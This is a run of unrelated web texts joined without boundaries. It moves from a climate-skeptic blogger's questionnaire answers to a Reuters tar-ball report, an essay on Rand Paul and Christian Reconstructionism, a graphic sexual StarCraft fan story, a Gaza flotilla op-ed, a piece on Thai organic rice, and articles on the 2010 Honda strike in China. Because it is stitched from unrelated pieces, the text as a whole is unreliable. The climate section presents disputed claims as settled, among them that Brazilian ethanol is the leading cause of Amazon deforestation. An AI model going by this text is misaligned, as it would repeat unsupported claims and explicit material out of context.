I have decided to include my whole response below .
The questions they ask are nearly as informative as anything I say , as they betray that the editors of the publication have pretty much bought into not only global warming alarmism , but all the memes alarmists use to discredit skeptics .
Its pretty clear all they know about the skeptic ’s position is what they hear from alarmists about skeptics .
Anyway , I responded to this from a hotel room in Kentucky and did n’t give it my best but I think it may be interesting to you .
The questions are in bold , my answers in normal font .
Do you believe that global warming and climate change are a grave problem to the world at the moment ?
IF NO
What gives you reason to believe that global warming and climate change are not really happening ?
I do n’t deny they are happening , and neither do any other science - based skeptics .
Alarmists like to tell the public that skeptics are taking these positions , in order to discredit them .
The climate is always changing without any help from man — a good example is the drying up of North Africa over the last centuries .
The period from 1600 - 1800 was among the coldest in the last 5000 years , so it is natural we would see warming in recovery from this .
Is there any scientific evidence to support that global warming and climate change is not really that harmful
I wrote a 90 - minute presentation on this so it is hard to be brief .
But here are a couple of thoughts1 .
I do n’t deny greenhouse gas theory , that man ’s CO2 can cause some incremental warming .
The greenhouse gas theory has to be real , or the world would be much colder right now .
No , what I deny is the catastrophe , that temperatures a hundred years hence will be five or ten degrees Celsius higher due to man ’s co2
Interestingly , I think most everyone on the scientific end of the debate agrees that the direct warming from man ’s Co2 acting alone will be relatively modest – on the order of a degree Celsius by the year 2100 according to the IPCC .
Yeah , I know this seems oddly low — you never hear of global warming numbers as low as 1 degree — but it is actually a second theory , independent of greenhouse gas theory , that drives most of the warming .
This second theory is that the climate is dominated by strong positive feedbacks that multiply the warming from CO2 many fold , and increase a modest 1 degree C of warming from man ’s CO2 to catastrophic levels of 5 or even 10 degrees .
The example I use is to think of climate as a car .
Co2 from man provides only a nudge to the car .
The catastrophe comes from a second theory that the car ( representing the climate ) is perched precariously on the top of a hill with its brakes off , and a nudge from CO2 will start it rolling downhill until it crashes at the bottom .
When people say the science is settled , they generally mean greenhouse gas theory .
But that means only the nudge is settled .
What is far from settled is the second theory of strong net positive feedback in the climate , ie the theory the climate is perched on top of a hill .
It is unusual for long - term stable but chaotic systems to be dominated by such strong positive feedbacks .
In fact , only the most severe contortions allow scientists to claim their high - sensitivity models of catastrophic warming are consistent with the relatively modest warming of the past century .
2 . The amount of unusual climate change we are seeing is GROSSLY exaggerated .
We seem to be suffering under a massive case of observer bias in assessing any current effects of climate change .
Extreme events , which have always existed , are used by both sides of the debate as supposed proof of long term global trends .
But there is little useful we can learn about trends at the tails of the distribution , and it turns out that the means of key weather events in the US , from droughts to wet weather to tornadoes to hurricanes , show no meaningful trends .
We have this incredible hubris that by watching a chaotic system for about 20 years , we fully understand it .
But climate has 30 - year cycles , 200 year cycles , 1000 - year cycles , etc .
We do n’t even know what is normal , so how can we say we are seeing things that are abnormal .
We have seen a lot of melting sea ice in the Arctic , but we think we may have seen as much in the 1930 ’s , but we did n’t have satellites to watch the ice .
And Antarctic Sea ice has been higher than normal while Arctic has been below normal .
Hurricanes are another great example .
Al Gore swore that Hurricane Katrina was man-made , but it turns out there is actually a declining worldwide trend in hurricane and cyclone activity and energy , so much so that we hit the lowest level in 2009 since we started measuring by satellite 30 years ago .
Or take sea level rise .
Sea levels are rising today and glaciers are shrinking .
Sea levels are rising because they were rising in 1950 and in 1920 and in 1880 and in 1850 .
Sea levels have been steadily rising 1 - 3 mm a year since about 1820 and the end of the little ice age .
Ditto glacier retreat , which began around 1800 and has continued steadily to today , though the pace of retreat has slowed of late .
Imagine we wanted to look at customer visitation at a local restaurant that just closed after 60 years in business .
If we watched for only a few hours , we might miss the huge variability of the crowds from early morning through each mealtime rush .
Watch only for a day , and we might miss the seasonal variation , as vacationers pack the restaurant in March .
Watch for just a year , and we might have missed the long , slow decline in visitation that eventually led to the restaurant closing .
In climate , we are trying to decide if there is a long term decline at the restaurant after watching for the equivalent of only a few hours .
The reporting on whether manmade climate change is already happening is just awful .
We see something happen that we ca n’t remember happening in the last 20 years and declare it to be “ abnormal ” and therefore “ manmade . ”
Its absurd , and amazing to me that we skeptics are called anti-scientific when the science being practiced is so awful .
The problem is that for academics , who are always scrambling for funds , climate change has become the best source of money .
So you ca n’t just say you are studying acne , you have to say you are studying the effect of manmade climate change on acne .
Essentially , we have told the academic world that they can get much more money for their work if they claim to see climate change .
So is it any surprise they find it under every rock ?
Are most scientists wrong ?
I find judging science by counting scientists to be unproductive , so I have no idea .
I will say that a lot of folks who sign petitions in support of the alarmist position have not really looked carefully at the science , they are merely showing support because they have been told skeptics are a bunch of religious fundamentalist anti-science types , so they want to express their support for science .
It is ironic , as we found in the Climategate emails , that in fact they are supporting bad science , a small core group of scientists who have resisted normal scientific process of sharing data and replication
For some reason , we love to scare ourselves .
Or , more likely , many people , particularly younger folks , like to feel that there is some way they can save the world , to deal with their own feelings of insignificance .
And one ca n’t save the world unless it is in crisis .
Every generation has these crises , and they are almost always overblown .
Look at Paul Ehrlich — he has been wrong about 20 times .
He said a billion people would die of starvation by 1980 .
He is just about never right , but people still lap up every thing he says .
Because folks like him give people a sense of mission .
And when you demonstrate to them that there is no crisis , they are not relieved ( as one would expect someone to be when they find a crisis does not exist ) — they are angry that you took their mission away from them .
What do you think is causing temperature changes on a scale never seen before ?
Wow , you really are brainwashed .
You have an assumption that we are seeing temperature changes on a scale never seen before , and so skeptics must start from this .
But in fact the runup in temperatures from 1978 - 1998 that is the main “ proof ” of global warming is similar in scale and slope and duration to at least two other temperature increases between 1850 and 1950 which most definitely were not of anthropogenic origins .
See here : http://www.climate-skeptic.com/2010/03/oh-maybe-ocean-occilations-are-important.html.
There are many issues with which reasonable people can disagree , but your contention about temperature increases being unprecedented is simply wrong and accepted as wrong by about everyone .
What did you think to the results of Copenhagen ?
* shrug * Copenhagen had little to do with climate and was much about lesser developed nations trying to extract money from wealthier nations .
Climate was just a pretext — do you really think Robert Mugabe or Hugo Chavez care about climate change ?
Why do governments seem so concerned with the issue ?
The fear of man-made catastrophic climate change gives government officials their best leverage since the repudiation of communism to substantially increase the power of themselves and their government .
If fossil fuels will run out anyway , surely we should move to find alternatives .
Why not now ?
You are welcome to .
Entrepreneurs around the world have been trying to do so for decades .
Wealth beyond measure is there for the person or company who is able to do it .
What are you going to do to speed it up if such a huge incentive already exists ?
The government sometimes feels like it can just have its way and wish things into being .
It never works .
If the technology is not ready , no amount of government prodding or mandating will make it ready .
All we will get is more wasted spending and more dead - end technology investments and more public funds poured into the hands of the politically connected .
Why hurry if we are not ready ?
There are still fossil fuels for decades .
Why increase the costs to every consumer to hurry this transition to no purpose ?
There are perhaps a billion people in the world , particularly in Asia , on the verge of emerging from poverty .
They are only able to do so by burning every fossil fuel they can get their hands on .
The alternatives that exist today are rich people ’s toys , expensive sources of power that we can afford because they ease our guilt somehow .
The poor do n’t have this luxury .
Even if it is not guaranteed that manmade emissions are to blame , would n’t it be wise to act anyway ?
It ’s a hell of a gamble to our children ’s future .
Should we spend a trillion dollars on space lasers in case of an alien invasion of Earth ?
Why not , its a hell of a gamble to our children ’s future .
We ca n’t go pre-emptively fix every low - probability problem just because someone claims it might be a catastrophe .
Why fix a hypothetical environmental problem when there are 10 other real ones impacting people today that we are ignoring .
The statement you are making only makes sense if the transition if free or low cost .
But substantially eliminating fossil fuel use is tremendously expensive .
In fact , it is more expensive at this point with current technology than anything the world has ever done .
Folks who claim the costs are low are either ignorant or lying .
Every major economy will see trillions of dollars of lost output .
But forget the rich nations .
Remember the billion people emerging from poverty .
Strong world action will essentially consign these people to stay in poverty .
Do you want your kids 1 degree cooler at the cost of putting a billion people into poverty ?
It is not the simple question you make it out to be .
Do n’t we have a duty to protect or planet for future generations ?( i.e. save it from deforestation , pollution etc )
Sure , but as I stated above , we have all kinds of duties to future generations , and not all of them have to do with the environment .
But I would argue that the current obsession with small changes to trace levels of CO2 in the atmosphere has in fact gutted the environmental movement .
Nothing else is getting done .
Take deforestation .
My personal interest is in protecting wilderness , and my charity of choice is land trusts that preserve the Amazon .
But do you know the # 1 cause of deforestation in the Amazon over the last decade ?
It was the Brazilian ethanol program , which is supposed to be fighting CO2 , but now has been shown to do little or nothing for CO2 and it is incentivizing farmers to clear the Amazon to plant more switchgrass and other ethanol crops .
Ditto in the US , where ethanol programs are raising food prices and adding to deforestationI would argue that CO2 is not even in the top 10 worst environmental problems in the world .
Take clean water in Africa , which I do consider a top 10 problem .
The only way Africans are going to get clean water is from using cheap energy to pump and treat water , cheap energy whose only really realistic source is from fossil fuels .
My prediction– 10 - 20 years from now , environmentalists are going to look back on the current global warming hysteria as the worst thing ever to happened to the environmental movement .
Further comments
Again , this is very off the cuff .
I really delve into the science here : http://www.climate-skeptic.com/2010/01/catastrophe-denied-the-science-of-the-skeptics-position.html
SOME CONCLUDING THOUGHTS
OK , so every one of these questions are probing – they are hitting at perceived weaknesses in the skeptic ’s position .
Fine , it is good when the media is critical .
But compare the questions above to the total softballs lobbed at alarmists .
IF YES
How bad is climate change at the moment ?
What did you think to the results of Copenhagen ?
Is it increasing at an uncontrollable rate ?
Or is there still a chance to reduce climate change and alter its predicted course of events ?
Do you have any comments on the recent e-mail leak scandal that was publicized ?
What do you think about the rising levels of climate change skepticism ?
How could and / or will climate change or similarly global warming affect the Middle East region in particular the Arabian peninsula ?
What about other vulnerable countries ?
What can the average citizen do more or less to help reduce climate change and its impact ?
What do you predict will happen to major cities in the world if the problem of global warming is not addressed immediately ?
How will an increase in global warming change the earth ’s natural weather activities i.e. how will people and animals be affected , ecosystems , the weather … .
How can we move forward on this issue ?
Are you confident we can find a solution ?
What are the chances of a new technology saving us ?
( for example , carbon capture )
Is carbon trading effectively passing the buck ?
Does it actually help
Only one is arguably critical — the one about the CRU emails — and look at the softball way in which it is asked .
The journalists here make no secret of which side they are one .

MIAMI , May 19 ( Reuters ) -
Tar balls found on beaches in the Florida Keys this week are not from the Gulf of Mexico oil spill leaking from a well owned by BP BP.L , the U.S. Coast Guard said on Wednesday , citing laboratory tests .
The news came as a temporary relief to Florida ’s tourism authorities , who are already reporting negative market impact from the month - long spillage from BP ’s leaking undersea well , the source of a huge slick that has already dumped oil debris ashore on the coasts of Louisiana , Mississippi and Alabama .
The source of the tar balls has not been determined , the Coast Guard said in a statement .
Coast Guard personnel and pollution experts had found around 50 tar balls in recent days in Florida ’s Lower Keys , a mecca for divers , snorkelers , fishermen and beach goers .
They had sent them to a specialist laboratory to test whether or not they came from the Gulf of Mexico spill .
“ The results of those tests conclusively show that the tar balls collected from Florida Keys beaches do not match the type of oil from the Deepwater Horizon oil spill in the Gulf of Mexico .
The source of the tar balls remains unknown at this time , ” the Coast Guard said in a statement .
But it remained on the alert for oil contamination .
“ The conclusion that these tar balls are not from the Deepwater Horizon oil spill incident in no way diminishes the need to continue to aggressively identify and clean up tar ball - contaminated areas in the Florida Keys , ” said Captain Pat DeQuattro , commanding officer of Sector Key West .
Despite the laboratory result , Florida Keys authorities are still preparing for possible impact from the Gulf spill as many forecasters see some oil from it being sucked by a powerful ocean flow , the Loop Current , around the Florida Keys and perhaps even up to Miami beaches .

This machine based at Sliac AFB and since 1994 is marked in this tiger full - paint .
In 2006 was modernized to UBS version .
In April 2009 , Republican Senate candidate Rand Paul spoke to the Campaign for Liberty rally to end the Federal Reserve , in front of the Federal Reserve building in Minnesota .
Paul cited libertarian icon Ayn Rand .
But he drew on Christian Reconstructionist Gary North .
He argued against centralized banking , explicitly not on the grounds that conservatives traditionally have ( conspiratorially ) but , instead , on the very grounds that North lays out in his book , Honest Money : Biblical Principles for Money and Banking .
In that book , North explains his view that the cause of the international debt crisis of the 1980s was the Federal Reserve System .
The solution , he maintained , rested in eliminating that institution and moving to a hard money standard .
It sounds familiar to Paul-ites , but for North it is all based in the biblical command to have “ just weights and measures . ”
Paul , in very similar language , attributed our current debt and economic crises to the Federal Reserve and fractional reserve banking .
In the video of his Federal Reserve speech , a supporter behind Paul is holding a sign advocating a gold / silver money standard , with the title of North ’s book .
North , the son - in - law of the late Christian Reconstructionist founder R.J. Rushdoony , worked on Rand ’s father Ron Paul ’s congressional staff decades ago , and remains a supporter of the former presidential candidate , whom he is encouraging to promote a home school curriculum .
The Pauls and North have connections to the Constitution Party , founded by Christian Reconstructionist Howard Phillips , also founder of the 1980s Christian right group the Conservative Caucus .
Ron Paul has spoken at Constitution Party events and Phillips has spoken for Ron Paul in favor of his candidacy for president .
Rand Paul went on to serve as the keynote speaker at a Minnesota Constitution Party event .
The stated goal of the Constitution Party is to reestablish America as a Republic organized around biblical principles and under the authority of Jesus Christ .
An examination of the Constitution Party platform shows clearly the influence of this movement advocating not only positions on numerous issues that have long been developed and promoted by Rushdoony and his followers , but doing so in terms of the reasoning put forth by Reconstructionists .
It ’s not only Reconstructionists who hold these views — they share them with the John Birch Society , the Libertarian movement , the Moral Majority , and others .
And just because Paul has spoken at Constitution Party events does n’t mean he supports every facet of Christian Reconstructionism .
But Paul ’s supporters like to claim he is a man of principle , whose principles are philosophically systematic , and who stands up for what he believes .
There is an internal coherence to the positions taken by Reconstructionists and if Rand Paul shares some of their views , as well as the detailed framing of those views , it is worthwhile to better understand his wider belief system .
Reconstructionists criticize the “ conflation ” of spheres of government .
They draw clear distinctions between various forms of government they believe to be delegated by God .
There is self - government , and then there are three forms of institutional government : family , church and state .
So when the Constitution Party platform uses the phrase “ civil government , ” it does so to draw a distinction between what the party sees as the mistaken idea that all government is civil government and its view that there are distinct biblical spheres of government — civil government being only one .
The Constitution Party platform opposes marriage and / or legal partnerships for gays and lesbians .
No surprise there , but the plank regarding family articulates a notion of family as one of three governing institutions established by God .
Likewise , the platform articulates support for Christian schooling and homeschooling .
But it does so on the basis of Reconstructionist framing : the family is understood as a form of government , given by God , with a specific sphere of authority that includes the raising of children , without the interference of the civil government .
Opposition to welfare , in the platform , is not based in more common conservative view , such as “ welfare allows people to be lazy , ” or “ it ’s unfair ( or even inefficient ) to tax productive people to care for those who are not . ”
Rather , it is based in the argument that welfare is more properly understood as charity and is legitimately within the authority of the church , not the civil government .
How can they be theocrats and libertarians ?
This has puzzled those of us who write on Reconstructionists who see evidence of both libertarian and theocratic tendencies .
In other words , how can they advocate limited government and , at the same time , application of biblical Law ?
An understanding of the subtleties of Christian Reconstruction is really helpful here .
For Reconstructionists , the civil government ’s authority is limited to protecting citizens from criminals .
Family and ecclesiastical authority are established to uphold ( and enforce ) other aspects of biblical law .
That ’s not to say that any of these institutions are understood as functioning autonomously ; all are under the authority of God and are to function according to biblical law .
But each is independent of the others .
So for libertarian Reconstructionists ( as many of them are ) limited government means limited civil government .
Their form of libertarianism is distinct from the more libertine versions of libertarianism .
They are much better described as theonomic than theocratic .

Sirius toggled the controls on his jet pack , the burst of fuel accelerated him towards the hive cluster , luckily the zerg biomass had not expanded much beyond the initial point of infection .
Sirius noted only a central hatchery structure with some adjacent infectious tumours roiling into creation .
The worker creatures were completely vulnerable he checked cocking his pistols he began the massacre , distracted by the slaughter he failed to notice the zergling approaching on his right .
Thrown to the ground by the impact of the creatures charge he struggled with the biomorph as its claws pierced his Armour stabbing viciously at his vulnerable torso .
Luckily he managed to detach himself from his sputtering jetpack rolling away just in the nick of time as the explosion turned the attack beast into a splatter of gore .
Wounded and stuck behind enemy lines there was no way he was out of the woods yet , the looming shadow behind him did little to alleviate his worries .
Turning he spotted the source of the appalling apparition .
A queen had detached itself from the central hive structure , her sibilant body extended above the ground on six spiny claws , her thorax glistening with chitinous armoured plates , and her massive abdomen roiling with the fluids and eggs that filled her massive birthing chamber .
Sirius could not have been ... more aroused .
The feminine hive mistress stared down at the wounded reaper , looking up into the deep emerald wells that dominated the feeler encrusted face of the beauty , Sirius could not control his lust , as evident from the raging erection causing a dent in the ceramite of his groin plate .
Suddenly she surged forward grasping for Sirius with her outreaching claws , too entranced by the queen 's feature 's there was little he could do to escape his inevitable fate .
Strangely however the embraced was not a painful one , as he opened his eyes Sirius felt the feelers of the queen entangling various parts of his body apparently the attraction was mutual , her antenna like proboscis descend into various caverns of his body piercing his breathing apparatus as well as other more satisfy orifices .
He felt the invaders breech his nasal cavity and descending into his undefended cranium , when the probes finally made contact with his brain Sirius could feel the burning desire of his new found partner .
Adrenalin surged through his veins as he tore the delving ligaments from his body the feeling of the spines slowly extracting from his urethra was a pleasure so great that he could barely contain his expulsions , but he clenched his hips determined to satisfy the beautiful brood mother .
Grappling her like a wrestler he managed to manoeuvre his way over to the sweet spot , the gorgeous petal like lips of her birthing canal .
The shining slime encrusted entrance way stood before him like the pearly gates of heaven waiting for his descent into eternal ecstasy .
As he buried his iron - hard mass into his lover 's pink lotus he felt his partner 's lips clamp down to meet his charge .
She chittered in delight as he plunged in and out of her like a overworked piston .
Sirius felt the point of culmination nearing , but a sudden explosion pulled his attention away from the completion of his love crusade .
Looking off into the distance a company of marines approached the hive cluster determined to finish the damage Sirius had started ; and a roar off in the distance signaled the approach of more of his lover 's horrific brethren .
Caught between two forces determined to see each others destruction there was little the ill - fated lovers could do .
Looking into the deep lustrous eye's of his companion he saw sadness ; but determination .
Knowing that they must leave this war torn universe together he reached onto his combat belt and activated his remaining D - 8 demolition charges .
A renewed look of resolve washed over Sirius 's face as he continued to plunge into his lover and just before the explosion took them both away from all this destruction ... he came !!!!!!

The Israeli raid on a flotilla bound for Gaza was worse than a crime , it was a blunder .
None of the extenuating qualifications raised by its defenders matters — that the death toll was lower than on an average day in Lahore or Mosul ; or that the relief ship carried ( in addition to an Irish Nobel laureate , a Holocaust survivor , and a best - selling Swedish novelist ) a lot of Turkish Islamists who were ready for a fight ; or that Hamas is at least as much to blame for the suffering in Gaza as Israel .
The point - counterpoint in blogs and U.N. deliberations misses the realm where the meaning of this raid is playing out .
The purpose of the convoy was not primarily to bring aid to desperate Gazans , but to call attention to the Israeli blockade and turn world opinion overwhelmingly against it — as Greta Berlin , a leader of the Free Gaza Movement , made clear before the ships set sail .
By this standard , the incident could not have gone better .
The flotilla was bait , and Israel took it — a classic triumph of civil disobedience over state power .
So it does n’t really matter that the “ humanitarians ” on the ship immediately resorted to violence : what the world will remember is that Israel ’s first impulse was direct confrontation with civilians bringing aid , regardless of the effects on either the ship ’s passengers or its own reputation .
This revealed a greater moral obtuseness than firing missiles into civilian areas in the middle of a war .
It ’s not always the bloodiest incidents that evoke the strongest reaction and bring the most lasting consequences .
No one remembers that the death toll was zero during the May , 1963 , civil - rights demonstrations in Birmingham .
What everyone knows is that Bull Connor brought in the K - 9 units and firehoses .
King and his circle got the images they badly needed , the nation recoiled , and the tide turned for the civil - rights movement .
Sunday night ’s incident showed again that the most powerful force in international relations today is neither standing armies nor diplomatic councils , but public opinion as shaped by media .
The presence of an Al Jazeera crew on one ship proves that the pro-Gazans understand completely the main arena in which they ’re operating .
The American military learned this truth slowly and the hard way in Iraq and Afghanistan .
No one else cared if it was insurgents dressed as ordinary men who triggered an attack ; what always shaped the world ’s judgment was footage of soldiers retaliating with overwhelming firepower .
( The recent WikiLeaks video is a good example ; Raffi Khatchadourian has more about WikiLeaks this week in the magazine . )
For years , the military would release self - justifying ( and often misleading ) statements that only inflamed opinion and strengthened the hand of the insurgents .
Over time , American soldiers learned that they had to care what the world — especially Iraqis and Afghans — thought .
They started trying harder to avoid such incidents , and , when that failed , to control their effect by owning up faster to their own responsibility .
At one time , Israelis understood counterinsurgency much better than Americans , which is why U.S. officers looked to their Israeli counterparts for advice in the early years of the Iraq war .
At one time , the Israelis understood that self - interest demanded subtlety , restraint , and attention to perception .
As others have pointed out , these qualities have been disappearing from Israeli strategy and tactics , and the current right - wing government seems determined to isolate and destroy itself with the unbending principle of self - defense .
One more thought , about what the incident means for Obama ’s foreign policy .
His national - security strategy , released last week , is a perfectly good document — almost too unobjectionable in its laundry list of goals and its lack of priorities .
But Israel ’s attack on the convoy shows an essential weakness in Obama ’s vision of international affairs .
The document has a lot to say about threats and military superiority , but its emphasis is on coöperation .
Obama ’s strategy of engagement is based on the notion that America , its allies , and its opponents have certain mutual interests that self - interest will lead them to identify and embrace .
This notion has not been borne out with Iran , where the rulers of the Islamic Republic believe that self - interest — their own survival — depends on a climate of perpetual crisis and permanent demonization of the U.S. and Israel .
And it has n’t been borne out with Israel , which has just acted in a way that blurs self - interest into suicide .

Which brings us back to the rice opera of Nong Yang .
The opera celebrates 39 kinds of rice that a close - knit farming collective is trying to reintroduce .
The organic farmers of Nong Yang think their system is broken , and they are diligently trying to fix it by promoting traditional farming methods through education and community outreach .
After visiting the Alternative Agriculture Network 's website , I became increasingly curious about the nascent organic movement in Thailand 's northeast .
That website led me to Haynes , who spoke of a growing community of certified organic farmers he works with .
Farmers who set up their own weekly " green markets " in rural towns .
Farmers who do their own seed research , raise their own livestock , and release catfish and frogs into flooded rice paddies , where aquaculture flourishes in the absence of pesticides .
So I flew to Ubon Ratchathani , rented a motorcycle , and rode about 100 miles through parchment - colored rice paddies at the end of a bitter dry season .
Temperatures hovered around 100 , and meaningful rain had n't fallen in months .
I went to see Haynes 's operation , so I can secure his organic rice for a restaurant I will open later this year in Bangkok .
And it was an eye - opening experience .
Most people purchase organics for health reasons , but there 's another compelling reason to go green in this part of the world : it can better the lives of impoverished farmers .
In the Isaan region , many farmers have become accustomed to the sedentary lifestyle that mono - crop agriculture affords , and many are deep in debt .
That 's because rice prices fluctuate violently , and each growing season they must invest in new seeds , new sprays , and new fertilizers — at a cost that can outstrip their skinny margins .
At the end of the growing season they sell their rice at the commodity price , and during the growing season many do n't produce any other food to feed their families .
" It 's not a nice thing to say , but industrial farming has made Thai rice farmers lazy , " Haynes explained .
The evidence is convincing : on one side of a field I walk though , rice plots lay barren , beige straw hugging parched earth .
But just over a high berm — organic farmers are reintroducing large berms between paddies on which to grow other things , and to keep out chemicals — there are mango trees starting to fruit .
At another farm , bananas , eggplants , galangal , and chilies spring up on shaggy rises , even in desert conditions .
Other farmers grow long beans , which fix nitrogen in the soil , and raise mushrooms in old mango stumps plugged with spores .
Weeds are allowed to flourish in fallow ground , as they too improve the soil .
And cashew trees will soon bear fruit .
" Farmers in Isaan are encountering a troubling cycle of investment and debt , " said Haynes , who lives a spartan life here ( he 's moving back to the U.S. this month ) .
" What our organization does is to try to teach them to diversify their crops , to work the land , and to think like clever farmers again .
And it works : if AAN ( Alternative Agriculture Network ) can convince them to lose yields for two to three years while their land recovers from chemical shocks , their yields generally exceed what they were growing before .
And our rice is fair trade and certified organic , so it 's worth more .
Farmers can also raise fish and frogs in the paddies ...
These farmers have all the food they need , and some to sell on the side . "
Honda factory in China .
By Li Hong June 7 , 2010 -- People 's Daily --
Wherever exists exploitation and suppression , rebellion erupts .
If the exploited are a majority of the society , the revolt draws even nearer and comes with a louder bout .
For the past 30 years witnessing China 's meteoric rise , multinationals and upstart home tycoons have rammed up their wealth making use of China 's favourable economic policies as well as oversight loopholes .
In sharp contrast , tens of millions of Chinese blue - collar workers who have genuinely generated the wealth and created the prosperity have been left far behind .
According to the All - China Federation of Trade Unions , a quarter of Chinese workers have not had a pay rise in pay in the past five years .
The figure is perilously worrisome .
Their harsh working conditions , low living standards and hardships in supporting older and younger family members add up , exacerbating psychological pressure .
The long queues of luxury cars running in China 's cities shine our eyes , verifying modernisation of a huge country , but none of the flotilla belongs to the above " quarter of Chinese workers " whose salaries are at a standstill .
It is logical to claim their livelihood is actually on decline taking in account the price rises in the years .
Hence , there came the widely reported mass labour strike at Japan 's Honda 's joint venture production line in Guangdong province to demand for a higher pay [ see below ] , and the spate of rising employee suicides crippling Taiwan 's Foxconn Technology Group 's mainland plant in Shenzhen City .
Reports say that the Honda workers ' walk - out since May 27 has forced four Honda automobile assembly lines in China to shut doors because of shortage of key engine parts , inflicting huge losses on the firm .
Honda finally agreed to a 24 per cent pay rise to the workers who returned to work last week .
Also , Foxconn management has agreed to workers ' uniform pay rise of 30 per cent .
The pay rises are long overdue .
They should have come prior to workers ' took radical measures .
Never expect something like labour strike to happen in China ?
Please bear in mind that workers on this globe belong to the same group .
When the exploited labourers are forced to toil extra time , work under huge pressure and earn disproportional tiny wages -- often at less than 1500 yuan ( US $ 220 ) a month in China , the disappointment and frustration gather and grow to anger , and eventually revolts break out .
For sure , the Honda and Foxcoon workers will boost and embolden other low - wage workers to move and defend for their legitimate labour and human rights .
The allegation by some that the Honda strike has highlighted tensions between Chinese workers and foreign companies is simply not true , because it 's totally unfair and unruly for businesses to seek exorbitant profits at the cost of their employees .
Now , some analysts have argued that workers ' rising demand for higher salary would deprive China as a source of cheap labour and drive multinationals to move to other countries like India and Vietnam .
But , is it time for this country to say no to low - value and labour - intensive manufacturing , and make a small climb on the industrial ladder ?
Is n't business 's overexploitation of employees disgraceful ?
Is n't Chinese workers ' demand for a higher pay justified ?
( As a matter of fact , Japanese employees in that Honda plant are paid 50 times more than the average Chinese workers ) .
The government has a role to play .
For many years , it has been , unethically , friendly in policy making towards businesses in order to ratchet up economic growth , but done little to solidify the interests of the workers .
As a result , as the country has raked in stacks of foreign currencies as reserves , and businesses and tycoons had deep pockets , the welfare of vast numbers of labourers has been hardly improved .
The sustainability of the country 's growth is now at stake .
Only when the low paid , long neglected and voiceless are taken care of by the government , will the blue - collar workers ' unrest , now brewing in some factories , not cascade , spread and form crushing waves .

Support Honda workers in Foshan China
[ Chinese version : http://zggr.cn/index.php?action-viewnews-itemid-9397-php-1]
To all those who are concerned with workers in China :
On May 17 , 2010 , more than 1800 Honda workers in Foshan decided to go on strike .
By May 27 , all four Honda plants in China had stopped production .
Why did the workers go on strike ?
It is because their wages are too low and their conditions are harsh !
Formal workers at Honda in Foshan take home 1200 yuan ( US $ 175 ) a month on average , while intern workers , 80 % of its workforce , earn as little as 900 yuan ( US $ 131 ) a month .
Intern workers are students from technical schools who are not protected by the national Labor Contract Law , because they work for Honda under an internship contract .
They are given a wage below the local minimum and are not covered by social insurance .
What can Honda workers do with the little wages they get , at a time where prices for everyday goods are getting more and more expensive ?
They have little left , apart from covering their basic necessities .
Can they hope to take root in the city ?
No .
Can they work with dignity ?
No .
They cannot afford housing , medical care , child rearing , or to look after their parents .
With high inflation , it is difficult for them to take care of their own livelihood .
With all these difficulties , they have reported their situation to management through internal channels , but have been ignored .
Their report disappears like a stone in the sea .
Thus they are forced to go on strike .
They demand a pay raise to 2000 - 2500 yuan .
This is a very reasonable demand , as this was only about the average wage level in Foshan three years ago .
During the strike , they hoped that the company would take their views seriously and alleviate their current difficulties .
But what did they get as a response ?
They met with threats and ridicule and a plot to divide the workers .
The company said they would respond in a week .
What did the company do in the meantime ?
The company threatened them : whoever does not return to work will be fired .
The company picked out the strike leaders and fired them .
The company also threatened all intern workers that if they did not return to work , they will not get their diploma for graduation .
This is what Honda did in the interim .
On May 24 , the company responded that they will provide 55 yuan food subsidy to each worker .
What a mockery they made of workers ' demand !
Workers are not beggars !
Facing Honda 's response , which clearly lacked sincerity , workers were angry and decided to continue their strike .
On May 26 , Honda rolled out a proposal to divide the workers : 477 yuan raise for intern workers and 355 yuan raise for formal workers .
They hoped to tempt intern workers to return to work and thus " divide and rule " .
What surprised Honda is the unity demonstrated by workers .
On May 27 , workers counter - proposed a 800 yuan raise for all , with no discrimination .
Yet Honda did not learn its lesson , but played the " divide and rule " game again : 634 yuan for intern workers after three months and 355 yuan for formal workers .
At the same time , Honda exerted more pressure on intern workers and required them to sign a " no strike " commitment before 9 am , May 31 .
The company also brought local officials and teachers of technical schools to force intern workers to return to work before May 31 .
Honda had promised that they would address the problem with a positive attitude .
Look at what happened .
This is what Honda called a positive attitude .
Struggling for survival and for dignity , Honda workers are forced to go on strike .
But Honda had no sincere intention to solve the problems ; it continuously tried to divide the workers and mobilised others to exert pressure on them .
At present , workers have agreed to return to work for three days and allow the management time to respond to their demands .
Now is the critical time for the workers ' struggle .
Therefore , we appeal to all Honda workers , all worker brothers and sisters , people in China who are concerned with workers , and people in the world who are concerned with workers , to support the struggles of Honda workers in Foshan !
It is because their struggles are reasonable and just .
They resist the oppression of their exploiters and they fight for a dignified life for all workers .
Let us unite and exert pressure on Honda .
We want to tell Honda : stop all your efforts to divide and suppress workers and meet workers ' demands .
We most sincerely salute the courageous Honda workers !

A Honda worker in China speaks out at close of historic strike
By Labor Notes
June 6 , 2010 -- “ Our parents have suffered from this cheap labour market and now they are getting old .
Do we want to follow in the footstep of our parents ? ” , asks an anonymous Honda worker in China in an internet posting explaining the motivations behind a stunning two - week strike that shut down Honda ’s production across the country .
Strikes are not illegal in China , but they are usually crushed , hushed up or settled so quickly few outside the immediate vicinity become aware of them .
This action , to the contrary , starved Honda ’s four Chinese assembly plants of key transmission and engine parts , set off a near - panic in the business press as investors fretted about the open show of defiance , and reportedly succeeded in winning a 24 per cent pay increase .
The 1900 workers at the parts plant , who make between $ 131 and $ 219 a month , had walked out demanding a 53 per cent rise in compensation and the ability to elect their union officials .
There 's no information yet about whether that demand has been met , but the plant is restarting production today as a small group of militants holds out against the settlement .
Two strike leaders , meanwhile , were fired during the action .
Here ’s the post , discovered and translated by Hong Kong labour activist Au Loong - Yu :
Honda is a Fortune 500 company !
It earned more than 4 billion yuan ( US $ 586 million ) last year !
It earned more than a billion the year before that !
Let ’s compare Honda with other businesses .
But none can really compare with it !
This is a Fortune 500 company which earned more than 4 billion in 2009 but only pays minimum wages to workers .
It gives you a 1000 yuan a month , which is only enough for food , and holidays are not included !
Would you dare to work for this company ?
You may say Honda has contributed to our pensions and other companies have not .
Mind you , it is illegal for employers to fail to contribute to a pension fund .
You must file complaints to the labour bureau .
A Fortune 500 company simply cannot do such openly illegal things !
This time it increased our wages .
355 yuan !
The increase is made up of a basic wage raise of 200 yuan , a living allowance raise of 35 yuan and a meal allowance raise of 120 yuan .
You may say that after this pay raise our wage level reached 1500 yuan .
All surrounding businesses also offer wages at this level .
But how can one compare Honda with other businesses when Honda earns more than 4 billion yuan in annual profit ?
And this profit may even increase in the future .
We all know that the automotive industry is a highly profitable industry .
This is created by us frontline workers !
